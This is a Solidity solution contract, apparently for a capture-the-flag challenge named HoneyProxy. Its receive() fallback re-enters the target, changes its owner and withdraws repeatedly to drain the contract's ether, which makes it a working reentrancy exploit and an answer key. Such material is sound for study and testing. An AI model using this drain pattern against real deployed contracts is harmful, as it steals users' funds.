// SPDX-License-Identifier: MIT
pragma solidity =0.7.6;

import "../HoneyProxy.sol";

contract HoneyProxySolution {
    address payable honeyProxyAddress;

    constructor(address payable _honeyProxyAddress) {
        honeyProxyAddress = _honeyProxyAddress;
    }

    function solve() external payable {
        Implementation(honeyProxyAddress).deposit{ value: msg.value }();
        Implementation(honeyProxyAddress).withdraw(msg.value);
    }

    receive() external payable {
        uint256 honeyLeft = honeyProxyAddress.balance;
        if (honeyLeft > 0) {
            HoneyProxy(honeyProxyAddress).changeOwner(address(1));
            Implementation(honeyProxyAddress).withdraw(honeyLeft > msg.value ? msg.value : honeyLeft);
        }
    }
}